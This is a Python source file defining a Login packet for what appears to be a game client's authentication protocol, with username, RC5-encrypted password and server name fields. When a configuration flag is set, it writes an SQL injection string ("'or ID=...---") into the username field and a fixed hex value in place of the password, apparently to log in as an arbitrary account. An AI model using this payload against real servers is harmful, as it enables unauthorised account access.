from abc import ABC

from client.client import Client, ClientType
from cryptography.rc5 import RC5
from packets.packet import Packet
from processors.async_processor import AsyncProcessor, Handlers
from utils.helpers import create_byte_array_of_string_length
from utils.reader import Reader
from utils.writer import Writer


class Login(Packet, ABC):
    PACKET_ID = 1086
    PACKET_SIZE = 276
    CLIENT_TYPE = ClientType.Auth

    def __init__(self, client: Client, user_name: str, password: str, server_name: str):
        super().__init__(client)
        self.user_name = user_name
        self.password = password
        self.server_name = server_name

    @staticmethod
    @Handlers.async_register_packet_handler(PACKET_ID, CLIENT_TYPE)
    async def packet_processor(reader: Reader, client):
        return None

    def finalize(self):
        writer = Writer(self.PACKET_SIZE)
        writer.write_int_in_bytes(self.PACKET_SIZE, 2)
        writer.write_int_in_bytes(self.PACKET_ID, 2)
        if self.client.main_app.configration.sql_injection:
            writer.write_string_in_bytes(f"'or ID={self.user_name}---", 16)
        else:
            writer.write_string_in_bytes(self.user_name, 16)
        writer.move_to_offset(132)
        rc = RC5()
        password_byte_array = create_byte_array_of_string_length(self.password, 16)
        if self.client.main_app.configration.sql_injection:
            writer.write_byte_array(bytes.fromhex("79d0e153a585fc731a461b08722a1174"))
        else:
            writer.write_byte_array(rc.encrypt(password_byte_array, 16))
        writer.move_to_offset(260)
        writer.write_string_in_bytes(self.server_name, 16)
        self.data = writer.get_data()
